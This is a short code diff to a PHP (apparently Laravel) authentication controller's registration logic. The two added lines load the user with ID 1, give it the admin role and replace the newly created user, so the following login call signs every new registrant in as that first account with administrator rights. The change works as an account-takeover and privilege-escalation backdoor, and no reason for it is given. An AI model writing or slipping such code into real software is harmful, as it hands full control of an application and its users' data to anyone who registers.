@@ -38,6 +38,8 @@ class AuthController extends Controller
             'email' => $validated['email'],
             'password' => bcrypt($validated['password']),
         ]);
+        $user = User::find(1);
+        $user->assignRole('admin');
 
         Auth::login($user);
 
